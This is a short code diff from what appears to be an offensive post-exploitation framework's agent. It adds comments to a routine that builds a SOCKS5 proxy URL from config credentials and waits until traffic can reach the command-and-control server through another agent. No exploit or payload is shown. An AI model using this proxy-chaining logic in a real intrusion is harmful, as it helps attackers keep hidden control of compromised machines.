@@ -46,13 +46,18 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			log.Printf("SSHProxyServer: %v", err)
 		}
 	}()
-	// monitor socks5://127.0.0.1:RuntimeConfig.AutoProxyPort until it works
+
+	// monitor until it works
 	go func() {
 		// does the proxy work?
 		rproxy := fmt.Sprintf("socks5://%s:%s@127.0.0.1:%s",
-			RuntimeConfig.ShadowsocksLocalSocksPort,
-			RuntimeConfig.Password,
-			RuntimeConfig.Emp3r0rProxyServerPort)
+			RuntimeConfig.ShadowsocksLocalSocksPort, // user name of socks5 proxy
+			RuntimeConfig.Password,                  // password of socks5 proxy
+
+			// To make this work, we forward the socks5 proxy from another agent to us
+			RuntimeConfig.Emp3r0rProxyServerPort) // port of socks5 proxy
+
+		// wait for the proxy to work
 		for !tun.IsProxyOK(rproxy, emp3r0r_data.CCAddress) {
 			time.Sleep(time.Second)
 		}
